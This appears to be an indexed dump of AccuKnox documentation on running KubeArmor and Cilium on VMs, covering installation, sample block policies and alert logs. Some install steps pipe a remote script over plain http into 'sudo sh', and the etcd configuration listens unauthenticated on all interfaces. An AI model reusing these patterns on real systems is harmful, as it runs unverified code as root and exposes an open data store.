VM/Bare-Metal"},{"location":"open-source/kubearmor-vm/#kubearmor-on-vmbare-metal","text":"KubeArmor is a Runtime Security engine that can protect your applications from unknown threats. This recipe explains how to use KubeArmor directly on VM/Bare-Metal host and was tested on Ubuntu hosts. The recipe installs kubearmor as systemd process and karmor cli tool to manage policies and show alerts/telemetry.","title":"KubeArmor on VM/Bare-Metal"},{"location":"open-source/kubearmor-vm/#download-and-install-kubearmor","text":"Install pre-requisites sudo apt update && sudo apt upgrade \\ sudo apt install bpfcc-tools linux-headers- $( uname -r ) \\ sudo apt install make libelf-dev llvm clang linux-headers-generic Install any of the following packages for bpf-tool depending on your system environment. sudo apt install linux-intel-iotg-5.15-tools-common sudo apt install linux-oem-5.6-tools-common sudo apt install linux-tools-common sudo apt install linux-iot-tools-common sudo apt install linux-tools-gcp sudo apt install linux-cloud-tools-gcp To install Kubearmor copy the whole commands and run it:\\ curl -s https://api.github.com/repos/kubearmor/KubeArmor/releases/latest \\ | grep \"browser_download_url.*deb\" \\ | cut -d : -f 2 ,3 \\ | tr -d \\\" \\ | wget -qi - sudo dpkg -i kubearmor_*_linux-amd64.deb","title":"Download and Install KubeArmor"},{"location":"open-source/kubearmor-vm/#start-kubearmor","text":"sudo systemctl enable kubearmor && sudo systemctl start kubearmor Check kubearmor status using sudo systemctl status kubearmor or use sudo journalctl -u kubearmor -f to continuously monitor kubearmor logs.","title":"Start KubeArmor"},{"location":"open-source/kubearmor-vm/#apply-sample-policy","text":"Following policy is to deny execution of sleep binary on the host: sleepdenypolicy.yaml 1 2 3 4 5 6 7 8 9 10 apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : /usr/bin/sleep # try sleep 1 action : Block Save the above policy to sleepdenypolicy.yaml To install karmor cli tool: curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin Then apply policy: karmor vm policy add sleepdenypolicy.yaml Now if you run sleep command, the process would be denied execution.","title":"Apply sample policy"},{"location":"open-source/kubearmor-vm/#get-alerts-for-policies-and-telemetry","text":"karmor log --json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \"Timestamp\" : 1639803960 , \"UpdatedTime\" : \"2021-12-18T05:06:00.077564Z\" , \"ClusterName\" : \"Default\" , \"HostName\" : \"pandora\" , \"HostPID\" : 3390423 , \"PPID\" : 168556 , \"PID\" : 3390423 , \"UID\" : 1000 , \"PolicyName\" : \"hsp-kubearmor-dev-proc-path-block\" , \"Severity\" : \"1\" , \"Type\" : \"MatchedHostPolicy\" , \"Source\" : \"zsh\" , \"Operation\" : \"Process\" , \"Resource\" : \"/usr/bin/sleep\" , \"Data\" : \"syscall=SYS_EXECVE\" , \"Action\" : \"Block\" , \"Result\" : \"Permission denied\" }","title":"Get Alerts for policies and telemetry"},{"location":"open-source/kubearmormatrix/","text":"VM Support Provider \u2003 \u2003 \u2003 Distro \u2003 \u2003 \u2003\u2003 Support \u2003 AWS \u2003 \u2003 \u2003Amazon Linux 2 \u2003 \u2003 \u2003 Yes SUSE \u2003 \u2003 \u2003SUSE Enterprise 15 \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 10 (Buster) \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 11 (Bullseye) \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 18.04 \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 20.04 \u2003 \u2003 \u2003 Yes Kubernetes Support Provider Distro Support AWS EKS Ubuntu Server 20.04 LTS Yes K8's Minikube on VirtualBox Yes Canonical MicroK8's Yes Rancher K3's on Ubuntu Yes Google GKE-COS (Rapid/Regular Release) Yes Google GKE-Ubuntu (Rapid/Regular Release) Yes AWS EKS Amazon Linux 2 Yes","title":"KubeArmor Support Matrix"},{"location":"open-source/kvmservice-nonk8s/","text":"Running Kubearmor/Cilium On VMs Using Non-K8s Control Plane \u00b6 Kubearmor is a runtime security engine that protects the host/VM from unknown threats. Cilium is a network security engine that can be used to enforce network policy in VMs. With Kubearmor and Cilium running on a VM, it is possible to enforce host based security policies and secure the VM both at the system and network level. Why we need a control plane? \u00b6 With Kubearmor running on multiple VMs, it is difficult and time consuming to enforce policies on each VM. In addition to that, Cilium needs a control plane to distribute information about identities, labels and IPs to the Cilium agents running in multiple VMs. Hence the solution is to manage all the VMs in the network from a control plane. KVM-Service \u00b6 Accuknox's KVM-Service (Kubearmor Virtual Machine Service) is an application designed to act as a control plane in a non-k8s environment and manage Kubearmor and Cilium running in multiple VMs. Using KVM-Service, users can manage their VMs, associate labels to them and enforce security policies. Note: KVM-Service requires that all the managed VMs should be within the same network. Design of KVM-Service \u00b6 Components Involved and it's use \u00b6 Non-K8s Control Plane etcd : etcd is used as a key-value storage and is used to store the label information, IPs and unique identity of each configured VM. KVM-Service : Manages connection with VM, handles VM onboarding/offboarding, label management and policy enforcement. Karmor (Support utility) : A CLI utility which interacts with KVM-Service for VM onboarding/offboarding, policy enforcement and label management. VMs : Actual VMs connected in the network Installation Guide \u00b6 The following steps describes the process of onboarding VMs and enforcing policies in the VMs using KVM-Service. 1. Install and run KVM-Service and dependencies on a VM (or standalone linux machine). This VM acts as the non-k8s control plane. 2. Onboard the workload VMs 3. Download the VM installation scripts 4. Run the installation scripts 5. Enforce policies in VM from the control plane 6. Manage labels Note : All the steps are tested and carried out in debian based OS distribution. Step 1: Install etcd in control plane \u00b6 Install etcd using below command sudo apt-get install etcd Output: Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: etcd 0 upgraded, 1 newly installed, 0 to remove and 8 not upgraded. Need to get 2,520 B of archives. After this operation, 16.4 kB of additional disk space will be used. Get:1 http://in.archive.ubuntu.com/ubuntu focal/universe amd64 etcd all 3.2.26+dfsg-6 [2,520 B] Fetched 2,520 B in 0s (9,080 B/s) Selecting previously unselected package etcd. (Reading database ... 246471 files and directories currently installed.) Preparing to unpack .../etcd_3.2.26+dfsg-6_all.deb ... Unpacking etcd (3.2.26+dfsg-6) ... Setting up etcd (3.2.26+dfsg-6) ... Once etcd is installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 Restart etcd sudo service etcd restart Check the status sudo service etcd status Output: \u25cf etcd.service - etcd - highly-available key value store Loaded: loaded (/lib/systemd/system/etcd.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2022-01-16 12:23:58 IST; 30min ago Docs: https://github.com/coreos/etcd man:etcd Main PID: 1087 (etcd) Tasks: 24 (limit: 18968) Memory: 84.2M CGroup: /system.slice/etcd.service \u2514\u25001087 /usr/bin/etcd Jan 16 12:23:57 LEGION etcd[1087]: 8e9e05c52164694d as single-node; fast-forwarding 9 ticks (election ticks 10) Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d is starting a new election at term 88 Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d became candidate at term 89 Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 89 Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d became leader at term 89 Jan 16 12:23:58 LEGION etcd[1087]: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 89 Jan 16 12:23:58 LEGION etcd[1087]: published {Name:LEGION ClientURLs:[http://localhost:2379]} to cluster cdf818194e3a8c32 Jan 16 12:23:58 LEGION etcd[1087]: ready to serve client requests Jan 16 12:23:58 LEGION systemd[1]: Started etcd - highly-available key value store. Jan 16 12:23:58 LEGION etcd[1087]: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged! Step 2: Install KVM-Service in control plane \u00b6 Clone KVM-Service code and checkout to non-k8s branch. git clone https://github.com/kubearmor/kvm-service.git Output: Cloning into 'kvm-service'... remote: Enumerating objects: 1252, done. remote: Counting objects: 100% (215/215), done. remote: Compressing objects: 100% (111/111), done. remote: Total 1252 (delta 122), reused 132 (delta 102), pack-reused 1037 Receiving objects: 100% (1252/1252), 139.62 MiB | 1.70 MiB/s, done. Resolving deltas: 100% (702/702), done. cd into kvm-service directory: cd kvm-service/ Run this command: git checkout non-k8s Output: Branch 'non-k8s' set up to track remote branch 'non-k8s' from 'origin'. Switched to a new branch 'non-k8s' Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code. make Output: logname: no login name cd /home/wazir/go/src/github.com/kubearmor/kvm-service/src/service; go mod tidy cd /home/wazir/go/src/github.com/kubearmor/kvm-service/src/service; go build -ldflags \"-w -s -X main.BuildDate=2022-03-01T10:00:34Z -X main.GitCommit=beb3ab8 -X main.GitBranch=non-k8s -X main.GitState=dirty -X main.GitSummary=beb3ab8\" -o kvmservice main.go Once compilation is successful, run KVM-Service using the following command. sudo ./kvmservice --non-k8s 2> /dev/null Output: 2022-01-16 13:06:16.304185 INFO BUILD-INFO: commit:901ea26, branch: non-k8s, date: 2022-01-16T07:35:51Z, version: 2022-01-16 13:06:16.304278 INFO Initializing all the KVMS daemon attributes 2022-01-16 13:06:16.304325 INFO Establishing connection with etcd service => http://localhost:2379 2022-01-16 13:06:16.333682 INFO Initialized the ETCD client! 2022-01-16 13:06:16.333748 INFO Initiliazing the KVMServer => podip:192.168.0.14 clusterIP:192.168.0.14 clusterPort:32770 2022-01-16 13:06:16.333771 INFO KVMService attributes got initialized 2022-01-16 13:06:17.333915 INFO Starting HTTP Server 2022-01-16 13:06:17.334005 INFO Starting Cilium Node Registration Observer 2022-01-16 13:06:17.334040 INFO Triggered the keepalive ETCD client 2022-01-16 13:06:17.334077 INFO Starting gRPC server 2022-01-16 13:06:17.334149 INFO ETCD: Getting raw values key:cilium/state/noderegister/v1 2022-01-16 13:06:17.335092 INFO Successfully KVMServer Listening on port 32770 Step 3: Install karmor in control plane \u00b6 Run the following command to install karmor utility curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using karmor \u00b6 Few example YAMLs are provided under kvm-service/examples for VM onboarding. The same can be used for reference. Lets use kvmpolicy1.yaml and kvmpolicy2.yaml file and onboard two VMs. cat kvmpolicy1.yaml Output: apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command: karmor vm add kvmpolicy1.yaml Output: Success The above output shows that the first VM is given the name testvm1 and is configured with two labels name:vm1 and vm:true . cat kvmpolicy2.yaml Output: apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm2 labels : name : vm2 vm : true Run this command: karmor vm add kvmpolicy2.yaml Output: Success The above output shows that the second VM is given the name testvm2 and is configured with two labels name:vm1 and vm:true . When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following the command. karmor vm list Output: List of configured vms are : [ VM : testvm1, Identity : 1090 ] [ VM : testvm2, Identity : 35268 ] Step 5: Generate installation scripts for configured VMs \u00b6 Generate VM installation scripts for the configured VM karmor vm --kvms getscript -v testvm1 Output: VM installation script copied to testvm1.sh Run this command: karmor vm --kvms getscript -v testvm2 Output: VM installation script copied to testvm2.sh Step 6: Execute the installation script in VMs \u00b6 Copy the generated installation scripts to appropriate VMs and execute the scripts to run Kubearmor and Cilium. The script downloads Kubearmor and Cilium Docker images and run them as containers in each VM. Kubearmor and Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Step 7: Apply and verify Kubearmor system policy \u00b6 Few example YAMLs are provided under kvm-service/examples for Kubearmor policy enforcement in VM. The same can be used for reference. cat khp-example-vmname.yaml Output: apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : nodeSelector : matchLabels : name : vm1 severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command: karmor vm --kvms policy add khp-example-vmname.yaml Output: Success 2. To verify the enforced policy in VM, run karmor in VM and watch on alerts. karmor log Output: gRPC server: localhost:32767 Created a gRPC client (localhost:32767) Checked the liveness of the gRPC server Started to watch alerts With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Output: cat: /proc/cpuinfo: Permission denied Run this command: karmor log Output: gRPC server: localhost:32767 Created a gRPC client (localhost:32767) Checked the liveness of the gRPC server Started to watch alerts == Alert / 2022-01-16 08:24:33.153921 == Cluster Name: default Host Name: 4511a8accc65 Policy Name: khp-02 Severity: 5 Type: MatchedHostPolicy Source: cat Operation: File Resource: /proc/cpuinfo Data: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY Action: Block Result: Permission denied Step 8: Apply and verify Cilium network policy \u00b6 The example policy provided in kvm-service/examples/cnp-l7.yaml describes a network policy which only allows request to two HTTP endpoints - /hello and /bye and block everything else. cat cnp-l7.yaml Output: kind : CiliumNetworkPolicy metadata : name : \"rule1\" spec : description : \"Allow only certain HTTP endpoints\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"3000\" protocol : TCP rules : http : - method : GET path : \"/hello\" - method : GET path : \"/bye\" Run this command: karmor vm --kvms policy add cnp-l7.yaml Output: Success In kvm-service/examples/app , there is a sample HTTP server application http-echo-server.go that sends the URL path of the request as the response. Copy the file http-echo-server.go to the VM which has the label name: vm1 and run the HTTP server. go run http-echo-server.go Output: \ud83d\ude80 HTTP echo server listening on port 3000 Switch to the VM which has the label name: vm2 and try to access vm1 's HTTP server. curl http://10.20.1.34:3000/hello Output: hello Run this command: curl http://10.20.1.34:3000/bye Output: bye Run this command: curl http://10.20.1.34:3000/hi Output: Access denied Run this command: curl http://10.20.1.34:3000/thank-you Output: Access denied The above output shows that, For URLs that are listed in the configured network policy, the response is received from the HTTP server For URLs that are not listed in the configured network policy, the requests are denied. To verify this, switch to the VM which has label name: vm1 and run hubble to view the network logs. docker exec -it cilium hubble observe -f --protocol http Output: Mar 1 12:11:24.513: default/testvm2:40208 -> default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/hello) Mar 1 12:11:24.522: default/testvm2:40208 <- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 7ms (GET http://10.20.1.34/hello)) Mar 1 12:11:43.284: default/testvm2:40212 -> default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/hello) Mar 1 12:11:43.285: default/testvm2:40212 <- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 1ms (GET http://10.20.1.34/hello)) Mar 1 12:11:46.288: default/testvm2:40214 -> default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/bye) Mar 1 12:11:46.288: default/testvm2:40214 <- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 0ms (GET http://10.20.1.34/bye)) Mar 1 12:11:48.700: default/testvm2:40216 -> default/testvm1:3000 http-request DROPPED (HTTP/1.1 GET http://10.20.1.34/hi) Mar 1 12:11:51.997: default/testvm2:40218 -> default/testvm1:3000 http-request DROPPED (HTTP/1.1 GET http://10.20.1.34/thank-you)","title":"Deploying KubeArmor policies with VMs/Bare-Metal at scale"},{"location":"open-source/kvmservice-nonk8s/#running-kubearmorcilium-on-vms-using-non-k8s-control-plane","text":"Kubearmor is a runtime security engine that protects the host/VM from unknown threats. Cilium is a network security engine that can be used to enforce network policy in VMs. With Kubearmor and Cilium running on a VM, it is possible to enforce host based security policies and secure the VM both at the system and network level.","title":"Running Kubearmor/Cilium On VMs Using Non-K8s Control Plane"},{"location":"open-source/kvmservice-nonk8s/#why-we-need-a-control-plane","text":"With Kubearmor running on multiple VMs, it is difficult and time consuming to enforce policies on each VM. In addition to that, Cilium needs a control plane to distribute information about identities, labels and IPs to the Cilium agents running in multiple VMs. Hence the solution is to manage all the VMs in the network from a control plane.","title":"Why we need a control plane?"},{"location":"open-source/kvmservice-nonk8s/#kvm-service","text":"Accuknox's KVM-Service (Kubearmor Virtual Machine Service) is an application designed to act as a control plane in a non-k8s environment and manage Kubearmor and Cilium running in multiple VMs. Using KVM-Service, users can manage their VMs, associate labels to them and enforce security policies. Note: KVM-Service requires that all the managed VMs should be within the same network.","title":"KVM-Service"},{"location":"open-source/kvmservice-nonk8s/#design-of-kvm-service","text":"","title":"Design of KVM-Service"},{"location":"open-source/kvmservice-nonk8s/#components-involved-and-its-use","text":"Non-K8s Control Plane etcd : etcd is used as a key-value storage and is used to store the label information, IPs and unique identity of each configured VM. KVM-Service : Manages connection with VM, handles VM onboarding/offboarding, label management and policy enforcement. Karmor (Support utility) : A CLI utility which interacts with KVM-Service for VM onboarding/offboarding, policy enforcement and label management. VMs : Actual VMs connected in the network","title":"Components Involved and it's use"},{"location":"open-source/kvmservice-nonk8s/#installation-guide","text":"The following steps describes the process of onboarding VMs and enforcing policies in the VMs using KVM-Service. 1. Install and run KVM-Service and dependencies on a VM (or standalone linux machine). This VM acts as the non-k8s control plane. 2. Onboard the workload VMs 3. Download the VM installation scripts 4. Run the installation scripts 5. Enforce policies in VM from the control plane 6. Manage labels Note : All the steps are tested and carried out in debian based OS distribution.","title":"Installation Guide"},{"location":"open-source/kvmservice-nonk8s/#step-1-install-etcd-in-control-plane","text":"Install etcd using below command sudo apt-get install etcd Output: Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: etcd 0 upgraded, 1 newly installed, 0 to remove and 8 not upgraded. Need to get 2,520 B of archives. After this operation, 16.4 kB of additional disk space will be used. Get:1 http://in.archive.ubuntu.com/ubuntu focal/universe amd64 etcd all 3.2.26+dfsg-6 [2,520 B] Fetched 2,520 B in 0s (9,080 B/s) Selecting previously unselected package etcd. (Reading database ... 246471 files and directories currently installed.) Preparing to unpack .../etcd_3.2.26+dfsg-6_all.deb ... Unpacking etcd (3.2.26+dfsg-6) ... Setting up etcd (3.2.26+dfsg-6) ... Once etcd is installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379 Restart etcd sudo service etcd restart Check the status sudo service etcd status Output: \u25cf etcd.service - etcd - highly-available key value store Loaded: loaded (/lib/systemd/system/etcd.service; enabled; vendor preset: enabled) Active: active (running) since Sun 2022-01-16 12:23:58 IST; 30min ago Docs: https://github.com/coreos/etcd man:etcd Main PID: 1087 (etcd) Tasks: 24 (limit: 18968) Memory: 84.2M CGroup: /system.slice/etcd.service \u2514\u25001087 /usr/bin/etcd Jan 16 12:23:57 LEGION etcd[1087]: 8e9e05c52164694d as single-node; fast-forwarding 9 ticks (election ticks 10) Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d is starting a new election at term 88 Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d became candidate at term 89 Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 89 Jan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d became leader at term 89 Jan 16 12:23:58 LEGION etcd[1087]: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 89 Jan 16 12:23:58 LEGION etcd[1087]: published {Name:LEGION ClientURLs:[http://localhost:2379]} to cluster cdf818194e3a8c32 Jan 16 12:23:58 LEGION etcd[1087]: ready to serve client requests Jan 16 12:23:58 LEGION systemd[1]: Started etcd - highly-available key value store. Jan 16 12:23:58 LEGION etcd[1087]: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged!","title":"Step 1: Install etcd in control plane"},{"location":"open-source/kvmservice-nonk8s/#step-2-install-kvm-service-in-control-plane","text":"Clone KVM-Service code and checkout to non-k8s branch. git clone https://github.com/kubearmor/kvm-service.git Output: Cloning into 'kvm-service'... remote: Enumerating objects: 1252, done. remote: Counting objects: 100% (215/215), done. remote: Compressing objects: 100% (111/111), done. remote: Total 1252 (delta 122), reused 132 (delta 102), pack-reused 1037 Receiving objects: 100% (1252/1252), 139.62 MiB | 1.70 MiB/s, done. Resolving deltas: 100% (702/702), done. cd into kvm-service directory: cd kvm-service/ Run this command: git checkout non-k8s Output: Branch 'non-k8s' set up to track remote branch 'non-k8s' from 'origin'. Switched to a new branch 'non-k8s' Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code. make Output: logname: no login name cd /home/wazir/go/src/github.com/kubearmor/kvm-service/src/service; go mod tidy cd /home/wazir/go/src/github.com/kubearmor/kvm-service/src/service; go build -ldflags \"-w -s -X main.BuildDate=2022-03-01T10:00:34Z -X main.GitCommit=beb3ab8 -X main.GitBranch=non-k8s -X main.GitState=dirty -X main.GitSummary=beb3ab8\" -o kvmservice main.go Once compilation is successful, run KVM-Service using the following command. sudo ./kvmservice --non-k8s 2> /dev/null Output: 2022-01-16 13:06:16.304185 INFO BUILD-INFO: commit:901ea26, branch: non-k8s, date: 2022-01-16T07:35:51Z, version: 2022-01-16 13:06:16.304278 INFO Initializing all the KVMS daemon attributes 2022-01-16 13:06:16.304325 INFO Establishing connection with etcd service => http://localhost:2379 2022-01-16 13:06:16.333682 INFO Initialized the ETCD client! 2022-01-16 13:06:16.333748 INFO Initiliazing the KVMServer => podip:192.168.0.14 clusterIP:192.168.0.14 clusterPort:32770 2022-01-16 13:06:16.333771 INFO KVMService attributes got initialized 2022-01-16 13:06:17.333915 INFO Starting HTTP Server 2022-01-16 13:06:17.334005 INFO Starting Cilium Node Registration Observer 2022-01-16 13:06:17.334040 INFO Triggered the keepalive ETCD client 2022-01-16 13:06:17.334077 INFO Starting gRPC server 2022-01-16 13:06:17.334149 INFO ETCD: Getting raw values key:cilium/state/noderegister/v1 2022-01-16 13:06:17.335092 INFO Successfully KVMServer Listening on port 32770","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/kvmservice-nonk8s/#step-3-install-karmor-in-control-plane","text":"Run the following command to install karmor utility curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install karmor in control plane"},{"location":"open-source/kvmservice-nonk8s/#step-4-onboard-vms-using-karmor","text":"Few example YAMLs are provided under kvm-service/examples for VM onboarding. The same can be used for reference. Lets use kvmpolicy1.yaml and kvmpolicy2.yaml file and onboard two VMs. cat kvmpolicy1.yaml Output: apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command: karmor vm add kvmpolicy1.yaml Output: Success The above output shows that the first VM is given the name testvm1 and is configured with two labels name:vm1 and vm:true . cat kvmpolicy2.yaml Output: apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm2 labels : name : vm2 vm : true Run this command: karmor vm add kvmpolicy2.yaml Output: Success The above output shows that the second VM is given the name testvm2 and is configured with two labels name:vm1 and vm:true . When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following the command. karmor vm list Output: List of configured vms are : [ VM : testvm1, Identity : 1090 ] [ VM : testvm2, Identity : 35268 ]","title":"Step 4: Onboard VMs using karmor"},{"location":"open-source/kvmservice-nonk8s/#step-5-generate-installation-scripts-for-configured-vms","text":"Generate VM installation scripts for the configured VM karmor vm --kvms getscript -v testvm1 Output: VM installation script copied to testvm1.sh Run this command: karmor vm --kvms getscript -v testvm2 Output: VM installation script copied to testvm2.sh","title":"Step 5: Generate installation scripts for configured VMs"},{"location":"open-source/kvmservice-nonk8s/#step-6-execute-the-installation-script-in-vms","text":"Copy the generated installation scripts to appropriate VMs and execute the scripts to run Kubearmor and Cilium. The script downloads Kubearmor and Cilium Docker images and run them as containers in each VM. Kubearmor and Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.","title":"Step 6: Execute the installation script in VMs"},{"location":"open-source/kvmservice-nonk8s/#step-7-apply-and-verify-kubearmor-system-policy","text":"Few example YAMLs are provided under kvm-service/examples for Kubearmor policy enforcement in VM. The same can be used for reference. cat khp-example-vmname.yaml Output: apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : nodeSelector : matchLabels : name : vm1 severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command: karmor vm --kvms policy add khp-example-vmname.yaml Output: Success 2. To verify the enforced policy in VM, run karmor in VM and watch on alerts. karmor log Output: gRPC server: localhost:32767 Created a gRPC client (localhost:32767) Checked the liveness of the gRPC server Started to watch alerts With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Output: cat: /proc/cpuinfo: Permission denied Run this command: karmor log Output: gRPC server: localhost:32767 Created a gRPC client (localhost:32767) Checked the liveness of the gRPC server Started to watch alerts == Alert / 2022-01-16 08:24:33.153921 == Cluster Name: default Host Name: 4511a8accc65 Policy Name: khp-02 Severity: 5 Type: MatchedHostPolicy Source: cat Operation: File Resource: /proc/cpuinfo Data: syscall=SYS_OPENAT fd=-100 flags=O_RDONLY Action: Block Result: Permission denied","title":"Step 7: Apply and verify Kubearmor system policy"},{"location":"open-source/kvmservice-nonk8s/#step-8-apply-and-verify-cilium-network-policy","text":"The example policy provided in kvm-service/examples/cnp-l7.yaml describes a network policy which only allows request to two HTTP endpoints - /hello and /bye and block everything else. cat cnp-l7.yaml Output: kind : CiliumNetworkPolicy metadata : name : \"rule1\" spec : description : \"Allow only certain HTTP endpoints\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"3000\" protocol : TCP rules : http : - method : GET path : \"/hello\" - method : GET path : \"/bye\" Run this command: karmor vm --kvms policy add cnp-l7.yaml Output: Success In kvm-service/examples/app , there is a sample HTTP server application http-echo-server.go that sends the URL path of the request as the response. Copy the file http-echo-server.go to the VM which has the label name: vm1 and run the HTTP server. go run http-echo-server.go Output: \ud83d\ude80 HTTP echo server listening on port 3000 Switch to the VM which has the label name: vm2 and try to access vm1 's HTTP server. curl http://10.20.1.34:3000/hello Output: hello Run this command: curl http://10.20.1.34:3000/bye Output: bye Run this command: curl http://10.20.1.34:3000/hi Output: Access denied Run this command: curl http://10.20.1.34:3000/thank-you Output: Access denied The above output shows that, For URLs that are listed in the configured network policy, the response is received from the HTTP server For URLs that are not listed in the configured network policy, the requests are denied. To verify this, switch to the VM which has label name: vm1 and run hubble to view the network logs. docker exec -it cilium hubble observe -f --protocol http Output: Mar 1 12:11:24.513: default/testvm2:40208 -> default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/hello) Mar 1 12:11:24.522: default/testvm2:40208 <- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 7ms (GET http://10.20.1.34/hello)) Mar 1 12:11:43.284: default/testvm2:40212 -> default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/hello) Mar 1 12:11:43.285: default/testvm2:40212 <- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 1ms (GET http://10.20.1.34/hello)) Mar 1 12:11:46.288: default/testvm2:40214 -> default/testvm1:3000 http-request FORWARDED (HTTP/1.1 GET http://10.20.1.34/bye) Mar 1 12:11:46.288: default/testvm2:40214 <- default/testvm1:3000 http-response FORWARDED (HTTP/1.1 200 0ms (GET http://10.20.1.34/bye)) Mar 1 12:11:48.700: default/testvm2:40216 -> default/testvm1:3000 http-request DROPPED (HTTP/1.1 GET http://10.20.1.34/hi) Mar 1 12:11:51.997: default/testvm2:40218 -> default/testvm1:3000 http-request DROPPED (HTTP/1.1 GET http://10.20.1.34/thank-you)","title":"Step 8: Apply and verify Cilium network policy"},{"location":"open-source/open-source-accuknox/","text":"AccuKnox and Open Source \u00b6 AccuKnox provides most of the core policy enforcement engines and other associated tooling as open-source. Accuknox believes that a security focussed product needs to have full transparency in its operations and we also believe in the power of community. With that in mind AccuKnox has following open source components: Accuknox-Cilium \u00b6 Accuknox maintains a fork of cilium with certain added features. While Accuknox aims to eventually upstream the changes, the upstreaming work progresses at its own pace. Accuknox-Cilium currently has following additional features: SPIFFE based Identity Solution : Accuknox intends to use an Identity layer that is not k8s-dependent and can flexibly scale to any scenarios (IoT, Edge, 5G, VM, Bare-Metal etc). With that in mind, AccuKnox implemented the changes in Cilium control plane to provision the Identity for the workloads based on SPIFFE . AccuKnox made use of SPIRE reference implementation and integrated with Cilium. The details of this solution were presented in Kubecon 2021 (Production Identity Day) event and the recording is available here. The upstreaming work for this feature is currently in progress. Policy Audit/Staging : Policy audit/staging is an important feature that allows the user to validate the impact of policy before enforcing it. If there are connections or packets denied due to an application of a new policy that will show up in the audit policies whilst the application would still continue functioning. Cilium policies currently cannot be audited on per policy basis. This feature developed by Accuknox allows to handle two things: Get policy details on per alert/telemetry basis. With this it would be possible to get the policy statistics such as denied packets/connections on per policy basis. Allow policy audit configuration on per policy basis. KubeArmor \u00b6 KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operation) of containers and nodes at the system level. With KubeArmor, a user can: restrict file system access for certain processes restrict what processes can be spawned within the pod restrict the capabilities that can be used by the processes within the pod KubeArmor differs from seccomp based profiles, wherein KubeArmor allows to dynamically set the restrictions on the pod. With seccomp the restrictions must be placed during the pod startup and cannot be changed later. KubeArmor leverages Linux Security Modules (LSMs) to enforce policies at runtime. Policy Auto Discovery \u00b6 Accuknox policy enforcement engines based on KubeArmor and Cilium are very flexible and powerful. However, these policy engines must be fed with policies. With 10s or 100s of pods and workloads running in a cluster it is insanely difficult to handcraft such policies. 